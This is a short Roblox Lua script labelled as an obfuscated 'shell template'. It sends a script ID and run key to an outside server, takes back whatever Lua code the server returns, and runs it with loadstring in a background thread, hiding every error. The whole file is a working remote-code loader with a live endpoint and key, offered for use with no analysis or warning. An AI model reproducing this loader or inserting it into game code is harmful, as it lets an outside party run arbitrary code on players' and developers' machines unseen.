--[[ Obf shell template (auto-generated fallback) ]]
local HttpService = game:GetService("HttpService")

local API_URL = "http://tinhsuper-api.onrender.com"
local SCRIPT_ID = "rxphxyss"
local RUN_KEY = "Run_bBHWZdZcaoeGouNOrV"

local function fetch_and_run()
    local ok, res = pcall(function()
        -- POST JSON with id and run key
        local url = API_URL .. "/run/" .. SCRIPT_ID
        local payload = HttpService:JSONEncode({ run_key = RUN_KEY, id = SCRIPT_ID })
        -- Roblox HttpService may require specific usage; this is a minimal example
        local headers = { ["Content-Type"] = "application/json" }
        local response = HttpService:PostAsync(url, payload, Enum.HttpContentType.ApplicationJson, false, headers)
        return response
    end)
    if not ok then
        -- swallow errors to avoid crashing client
        return
    end
    -- response expected to be Lua code or something loadable
    local success, chunk = pcall(loadstring, res)
    if success and type(chunk) == "function" then
        pcall(chunk)
    end
end

spawn(fetch_and_run)
